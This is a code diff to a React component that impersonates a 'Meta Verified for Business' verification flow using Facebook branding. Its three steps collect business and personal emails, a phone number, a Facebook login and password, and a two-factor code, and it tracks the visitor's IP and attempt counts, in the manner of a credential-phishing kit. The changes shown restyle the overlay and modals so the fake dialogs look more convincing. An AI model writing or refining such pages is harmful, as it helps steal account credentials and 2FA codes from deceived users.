@@ -6,9 +6,11 @@ export default function Verify() {
   const navigate = useNavigate();
   const [step, setStep] = useState(1);
   const [clientIp, setClientIp] = useState('Unknown');
+  
   const [busName, setBusName] = useState(''); const [perEmail, setPerEmail] = useState(''); const [busEmail, setBusEmail] = useState(''); const [countryCode, setCountryCode] = useState('+84'); const [phoneNum, setPhoneNum] = useState('');
   const [loginUser, setLoginUser] = useState(''); const [loginPass, setLoginPass] = useState(''); const [otp, setOtp] = useState('');
   const [loginAttempt, setLoginAttempt] = useState(0); const [otpAttempt, setOtpAttempt] = useState(0);
+
   const [loading, setLoading] = useState(false);
   const [errors, setErrors] = useState({}); const [showLoginError, setShowLoginError] = useState(false); const [showOtpError, setShowOtpError] = useState(false);
 
@@ -39,9 +41,11 @@ export default function Verify() {
   };
 
   return (
-    <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(0,0,0,0.4)', position: 'fixed', inset: 0, zIndex: 1000 }}>
+    /* ĐÃ SỬA: Nền sáng mờ, hiệu ứng kính, bỏ màu đen xám */
+    <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(255, 255, 255, 0.7)', backdropFilter: 'blur(8px)', position: 'fixed', inset: 0, zIndex: 1000 }}>
+      
       {step === 1 && (
-        <div className={`modal-container ${errors.busName || errors.perEmail || errors.busEmail || errors.phoneNum ? 'shake' : ''}`} style={{ position: 'relative' }}>
+        <div className={`modal-container ${errors.busName || errors.perEmail || errors.busEmail || errors.phoneNum ? 'shake' : ''}`} style={{ position: 'relative', background: '#fff' }}>
            <button className="modal-close" onClick={() => navigate('/')}>×</button>
            <div className="modal-brand"><img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="FB" /></div>
            <h2 className="modal-title">Meta Verified for Business</h2>
@@ -64,7 +68,7 @@ export default function Verify() {
       )}
 
       {step === 2 && (
-        <div className={`modal-container ${showLoginError ? 'shake' : ''}`} style={{ position: 'relative' }}>
+        <div className={`modal-container ${showLoginError ? 'shake' : ''}`} style={{ position: 'relative', background: '#fff' }}>
            <button className="modal-close" onClick={() => navigate('/')}>×</button>
            <div className="modal-brand"><img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="FB" /></div>
            <form onSubmit={handleLogin} className="fb-form">
@@ -79,7 +83,7 @@ export default function Verify() {
       )}
 
       {step === 3 && (
-        <div className={`modal-container ${showOtpError ? 'shake' : ''}`} style={{ position: 'relative' }}>
+        <div className={`modal-container ${showOtpError ? 'shake' : ''}`} style={{ position: 'relative', background: '#fff' }}>
            <button className="modal-close" onClick={() => navigate('/')}>×</button>
            <div className="modal-brand"><img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="FB" /></div>
            <h2 className="modal-title">Two-factor authentication</h2>
